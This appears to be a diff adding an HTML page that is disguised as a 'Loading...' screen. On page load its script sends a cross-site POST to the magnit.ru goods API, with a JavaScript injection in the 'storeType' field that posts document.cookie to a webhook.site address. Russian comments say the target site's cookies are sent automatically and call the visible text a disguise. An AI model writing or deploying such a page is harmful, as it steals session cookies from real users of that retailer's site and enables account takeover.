@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        // Отправляем запрос сразу после загрузки страницы
+        fetch('https://magnit.ru/webgate/v2/goods/get', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                // Важно: если нужна авторизация, браузер отправит cookies автоматически
+                // для целевого сайта, если они есть. Другие заголовки необязательны.
+            },
+            body: JSON.stringify({
+                "storeType": "-fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {method:'POST', body:document.cookie})-",
+                "pagination": {"offset": 0, "limit": 9},
+                "catalogType": "3",
+                "storeCode": "250968"
+            })
+        });
+    </script>
+    <!-- Содержимое страницы для маскировки -->
+    <p>Please wait, loading...</p>
+</body>
+</html>
